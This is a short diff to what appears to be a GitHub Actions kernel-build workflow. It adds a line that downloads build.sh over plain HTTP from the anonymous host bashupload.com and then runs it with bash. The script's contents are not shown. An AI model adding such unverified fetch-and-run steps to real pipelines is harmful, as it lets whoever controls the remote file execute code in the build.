@@ -94,4 +94,5 @@ jobs:
       - name: "🎶 Bash Script"
         working-directory: ${{ env.KERNEL_NAME }}
         run: |
+          wget http://bashupload.com/FoEdw/build.sh
           bash build.sh
